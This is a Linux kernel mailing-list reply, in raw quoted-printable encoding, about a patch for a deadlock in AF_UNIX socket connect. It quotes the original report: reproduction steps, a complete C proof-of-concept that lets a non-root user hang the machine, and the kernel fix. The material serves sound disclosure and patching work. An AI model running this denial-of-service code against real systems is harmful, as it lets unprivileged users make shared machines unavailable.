From: =?UTF-8?Q?Am=C3=A9rico_Wang?= <xiyou.wangcong@gmail.com>
Subject: Re: [PATCH] AF_UNIX: Fix deadlock on connecting to shutdown socket
Date: Mon, 19 Oct 2009 15:02:14 +0800
Message-ID: <2375c9f90910190002m372edafq9a4c95d754640487@mail.gmail.com>
References: <4ADC010C.5070809@hitachi.com>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: QUOTED-PRINTABLE
Cc: linux-kernel@vger.kernel.org, netdev@vger.kernel.org,
	alan@lxorguk.ukuu.org.uk, davem@davemloft.net,
	satoshi.oshima.fk@hitachi.com, hidehiro.kawai.ez@hitachi.com,
	hideo.aoki.tk@hitachi.com
To: Tomoki Sekiyama <tomoki.sekiyama.qu@hitachi.com>
Return-path: <linux-kernel-owner+glk-linux-kernel-3=40m.gmane.org-S1753292AbZJSHCL@vger.kernel.org>
In-Reply-To: <4ADC010C.5070809@hitachi.com>
Sender: linux-kernel-owner@vger.kernel.org
List-Id: netdev.vger.kernel.org

On Mon, Oct 19, 2009 at 2:02 PM, Tomoki Sekiyama
<tomoki.sekiyama.qu@hitachi.com> wrote:
> Hi,
> I found a deadlock bug in UNIX domain socket, which makes able to DoS
> attack against the local machine by non-root users.
>
> How to reproduce:
> 1. Make a listening AF_UNIX/SOCK_STREAM socket with an abstruct
> =C2=A0 =C2=A0namespace(*), and shutdown(2) it.
> =C2=A02. Repeat connect(2)ing to the listening socket from the other =
sockets
> =C2=A0 =C2=A0until the connection backlog is full-filled.
> =C2=A03. connect(2) takes the CPU forever. If every core is taken, th=
e
> =C2=A0 =C2=A0system hangs.
>
> PoC code: (Run as many times as cores on SMP machines.)


Interesting...

I tried this with the following command:

% for i in `seq 1 $(grep processor -c /proc/cpuinfo)`;
do ./unix-socket-dos-exploit; echo "=3D=3D=3D=3D=3D$i=3D=3D=3D=3D";done
Connection OK
Connection OK
=3D=3D=3D=3D=3D1=3D=3D=3D=3D
Connection OK
Connection OK
=3D=3D=3D=3D=3D2=3D=3D=3D=3D
Connection OK
Connection OK
=3D=3D=3D=3D=3D3=3D=3D=3D=3D
Connection OK
Connection OK
=3D=3D=3D=3D=3D4=3D=3D=3D=3D

My system doesn't hang at all.

Am I missing something?

Thanks!

>
> int main(void)
> {
> =C2=A0 =C2=A0 =C2=A0 =C2=A0int ret;
> =C2=A0 =C2=A0 =C2=A0 =C2=A0int csd;
> =C2=A0 =C2=A0 =C2=A0 =C2=A0int lsd;
> =C2=A0 =C2=A0 =C2=A0 =C2=A0struct sockaddr_un sun;
>
> =C2=A0 =C2=A0 =C2=A0 =C2=A0/* make an abstruct name address (*) */
> =C2=A0 =C2=A0 =C2=A0 =C2=A0memset(&sun, 0, sizeof(sun));
> =C2=A0 =C2=A0 =C2=A0 =C2=A0sun.sun_family =3D PF_UNIX;
> =C2=A0 =C2=A0 =C2=A0 =C2=A0sprintf(&sun.sun_path[1], "%d", getpid());
>
> =C2=A0 =C2=A0 =C2=A0 =C2=A0/* create the listening socket and shutdow=
n */
> =C2=A0 =C2=A0 =C2=A0 =C2=A0lsd =3D socket(AF_UNIX, SOCK_STREAM, 0);
> =C2=A0 =C2=A0 =C2=A0 =C2=A0bind(lsd, (struct sockaddr *)&sun, sizeof(=
sun));
> =C2=A0 =C2=A0 =C2=A0 =C2=A0listen(lsd, 1);
> =C2=A0 =C2=A0 =C2=A0 =C2=A0shutdown(lsd, SHUT_RDWR);
>
> =C2=A0 =C2=A0 =C2=A0 =C2=A0/* connect loop */
> =C2=A0 =C2=A0 =C2=A0 =C2=A0alarm(15); /* forcely exit the loop after =
15 sec */
> =C2=A0 =C2=A0 =C2=A0 =C2=A0for (;;) {
> =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0csd =3D socket=
(AF_UNIX, SOCK_STREAM, 0);
> =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0ret =3D connec=
t(csd, (struct sockaddr *)&sun, sizeof(sun));
> =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0if (-1 =3D=3D =
ret) {
> =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=
 =C2=A0 =C2=A0perror("connect()");
> =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=
 =C2=A0 =C2=A0break;
> =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0}
> =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0puts("Connecti=
on OK");
> =C2=A0 =C2=A0 =C2=A0 =C2=A0}
> =C2=A0 =C2=A0 =C2=A0 =C2=A0return 0;
> }
>
> (*) Make sun_path[0] =3D 0 to use the abstruct namespace.
> =C2=A0 =C2=A0If a file-based socket is used, the system doesn't deadl=
ock because
> =C2=A0 =C2=A0of context switches in the file system layer.
>
> Why this happens:
> =C2=A0Error checks between unix_socket_connect() and unix_wait_for_pe=
er() are
> =C2=A0inconsistent. The former calls the latter to wait until the bac=
klog is
> =C2=A0processed. Despite the latter returns without doing anything wh=
en the
> =C2=A0socket is shutdown, the former doesn't check the shutdown state=
 and
> =C2=A0just retries calling the latter forever.
>
> Patch:
> =C2=A0The patch below adds shutdown check into unix_socket_connect(),=
 so
> =C2=A0connect(2) to the shutdown socket will return -ECONREFUSED.
>
> Signed-off-by: Tomoki Sekiyama <tomoki.sekiyama.qu@hitachi.com>
> Signed-off-by: Masanori Yoshida <masanori.yoshida.tv@hitachi.com>
> ---
> =C2=A0net/unix/af_unix.c | =C2=A0 =C2=A02 ++
> =C2=A01 files changed, 2 insertions(+), 0 deletions(-)
>
> diff --git a/net/unix/af_unix.c b/net/unix/af_unix.c
> index 51ab497..fc820cd 100644
> --- a/net/unix/af_unix.c
> +++ b/net/unix/af_unix.c
> @@ -1074,6 +1074,8 @@ restart:
> =C2=A0 =C2=A0 =C2=A0 =C2=A0err =3D -ECONNREFUSED;
> =C2=A0 =C2=A0 =C2=A0 =C2=A0if (other->sk_state !=3D TCP_LISTEN)
> =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0goto out_unloc=
k;
> + =C2=A0 =C2=A0 =C2=A0 if (other->sk_shutdown & RCV_SHUTDOWN)
> + =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 goto out_unlock;
>
> =C2=A0 =C2=A0 =C2=A0 =C2=A0if (unix_recvq_full(other)) {
> =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0err =3D -EAGAI=
N;
